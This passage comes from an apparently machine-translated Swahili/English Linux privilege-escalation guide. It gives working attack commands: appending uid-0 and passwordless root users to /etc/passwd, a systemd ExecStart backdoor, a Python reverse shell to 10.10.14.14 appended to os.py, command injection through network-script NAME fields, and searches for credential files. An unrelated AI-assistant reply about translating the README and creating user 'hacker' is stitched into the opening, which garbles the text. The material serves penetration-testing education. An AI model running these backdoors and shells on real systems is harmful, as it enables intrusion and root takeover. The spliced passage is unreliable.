mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
I don’t have the file contents of src/linux-hardening/privilege-escalation/README.md. Please paste the README.md content you want translated (or give permission to read it if you can provide access).

When you send the file contents I will:
- Translate the relevant English text to Swahili, preserving all markdown/html/tags/paths exactly as requested.
- Then generate a secure password and provide the exact commands you can run (as root) to add the user hacker and apply that password.

If you want me to generate the password now so you have it immediately, tell me whether you prefer:
- plain text password shown here, or
- a hashed password (bcrypt/sha512) to insert into /etc/shadow, or
- a command that sets the password on the target host (e.g., using chpasswd).

Which option do you prefer?
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` kwa kutumia `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo kuongeza mtumiaji wa bandia bila nenosiri.\
ONYO: inaweza kupunguza usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
Kumbuka: Katika majukwaa ya BSD `/etc/passwd` iko kwenye `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imebadilishwa jina kuwa `/etc/spwd.db`.

Unapaswa kuangalia ikiwa unaweza **kuandika katika baadhi ya faili nyeti**. Kwa mfano, unaweza kuandika kwenye baadhi ya **faili za usanidi za huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha server ya **tomcat** na unaweza **kuhariri faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kubadilisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itaendeshwa mara ijayo tomcat itakapowashwa.

### Angalia Folda

Folda zifuatazo zinaweza kuwa na chelezo au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Labda hutaweza kusoma ya mwisho, lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Eneo la Ajabu/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za hivi punde
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB mafayela
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml mafayela
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili zilizofichwa
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za wavuti**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Chelezo**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana zinazoweza kuwa na nywila

Soma msimbo wa [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na nywila**.\
**Chombo kingine cha kuvutia** ambacho unaweza kutumia kwa hili ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni programu ya chanzo wazi inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya ndani kwa Windows, Linux & Mac.

### Logi

Ikiwa unaweza kusoma logi, unaweza kufanikiwa kupata **taarifa za kuvutia/za siri ndani yao**. Kadri logi inavyo kuwa ya ajabu zaidi, ndivyo itakavyokuwa ya kuvutia (labda).\
Pia, baadhi ya **mbaya** configured (backdoored?) **audit logs** zinaweza kukuwezesha **kurekodi nywila** ndani ya audit logs kama ilivyoelezwa katika chapisho hiki: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kikundi kinachoweza kusoma logs** [**adm**](interesting-groups-linux-pe/index.html#adm-group) kitakuwa msaada mkubwa.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zenye neno "**password**" katika **jina** au ndani ya **content**, na pia angalia IPs na emails ndani ya logs, au hashes regexps.\
Sitaorodhesha hapa jinsi ya kufanya yote haya lakini ikiwa una nia unaweza kuangalia ukaguzi wa mwisho ambao [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) perform.

## Writable files

### Python library hijacking

Kama unajua kutoka **where** script ya python itaendeshwa na unaweza **can write inside** folda hiyo au unaweza **modify python libraries**, unaweza kubadilisha OS library na kuiweka backdoor (kama unaweza kuandika mahali script ya python itaendeshwa, copy na paste maktaba os.py).

To **backdoor the library** just add at the end of the os.py library the following line (change IP and PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Uvamizi wa logrotate

Udhaifu katika `logrotate` unamruhusu watumiaji wenye **ruhusa za kuandika** (write permissions) kwenye faili ya logi au saraka zake za juu kupata uwezo wa kuongeza ruhusa (escalated privileges). Hii ni kwa sababu `logrotate`, mara nyingi ikikimbia kama **root**, inaweza kudanganywa ili kuendesha faili zozote, hasa katika saraka kama _**/etc/bash_completion.d/**_. Ni muhimu kukagua ruhusa si tu katika _/var/log_ bali pia katika saraka yoyote ambapo rotation ya logi inafanywa.

> [!TIP]
> Udhaifu huu unahusu `logrotate` toleo `3.18.0` na zilizo zamani

Taarifa za undani kuhusu udhaifu zinaweza kupatikana hapa: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa kutumia [**logrotten**](https://github.com/whotwagner/logrotten).

Udhaifu huu ni sawa sana na [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** hivyo kila unapogundua unaweza kubadilisha logi, angalia nani anayesimamia logi hizo na ujaribu kuona kama unaweza kuongeza ruhusa kwa kubadilisha logi kwa symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Ikiwa, kwa sababu yoyote ile, mtumiaji anaweza **kuandika** script ya `ifcf-<whatever>` kwenye _/etc/sysconfig/network-scripts_ **AU** anaweza **kurekebisha** moja iliyopo, basi **mfumo wako umepwned**.

Network scripts, _ifcg-eth0_ kwa mfano, zinatumika kwa muunganisho wa mtandao. Zinataonekana kamili kama faili za .INI. Hata hivyo, zinatolewa ~sourced~ kwenye Linux na Network Manager (dispatcher.d).

Katika kesi yangu, `NAME=` iliyopo katika network scripts hizi haishughulikiwi ipasavyo. Ikiwa una **white/blank space katika jina mfumo unajaribu kutekeleza sehemu iliyofuata baada ya white/blank space**. Hii inamaanisha kwamba **kila kitu baada ya nafasi ya kwanza kinatekelezwa kama root**.

Kwa mfano: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Kumbuka nafasi tupu kati ya Mtandao na /bin/id_)

### **init, init.d, systemd, and rc.d**

The directory `/etc/init.d` ni nyumbani kwa **scripts** za System V init (SysVinit), **mfumo wa jadi wa usimamizi wa huduma za Linux**. Inajumuisha scripts za `start`, `stop`, `restart`, na wakati mwingine `reload` huduma. Hizi zinaweza kutekelezwa moja kwa moja au kupitia symbolic links zinazopatikana katika `/etc/rc?.d/`. Njia mbadala katika mifumo ya Redhat ni `/etc/rc.d/init.d`.

Kwa upande mwingine, `/etc/init` inahusishwa na **Upstart**, mfumo mpya wa **service management** ulioanzishwa na Ubuntu, unaotumia faili za usanidi kwa kazi za usimamizi wa huduma. Licha ya mpito kwenda Upstart, SysVinit scripts bado zinatumiwa pamoja na usanidi wa Upstart kutokana na tabaka la ulinganifu (compatibility layer) katika Upstart.

**systemd** inajitokeza kama meneja wa kisasa wa uanzishaji na huduma, ikitoa vipengele vya juu kama kuanzisha daemons kwa mahitaji (on-demand daemon starting), usimamizi wa automount, na snapshots za hali ya mfumo. Inapanga faili katika `/usr/lib/systemd/` kwa pakiti za distribution na `/etc/systemd/system/` kwa mabadiliko ya msimamizi, ikorahisisha mchakato wa usimamizi wa mfumo.

## Mbinu Nyingine

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks kwa kawaida hushikilia syscall ili kufunua utendakazi wa kernel wenye ruhusa kwa manager wa userspace. Uthibitishaji dhaifu wa manager (kwa mfano, ukaguzi wa signatures unaotegemea FD-order au mipangilio duni ya nywila) unaweza kumwezesha app ya ndani kujifanya manager na kuinuka hadi root kwenye vifaa ambayo tayari vimepata root. Jifunze zaidi na maelezo ya eksploiti hapa:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-driven service discovery katika VMware Tools/Aria Operations inaweza kutoa njia ya binary kutoka kwa mistari ya amri za mchakato na kuitekeleza kwa kutumia -v chini ya muktadha wenye ruhusa. Patterns zinazoruhusu mengi (kwa mfano, kutumia \S) zinaweza kuendana na listeners zilizoandaliwa na mshambulizi katika maeneo yanayoweza kuandikwa (kwa mfano, /tmp/httpd), zikisababisha utekelezaji kama root (CWE-426 Untrusted Search Path).

Jifunze zaidi na uone mtindo uliobadilishwa unaoweza kutumika kwa discovery/monitoring stacks nyingine hapa:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Kernel Security Protections

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Msaada zaidi

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (upatikanaji wa kimwili):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Marejeo

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)


- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)

- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
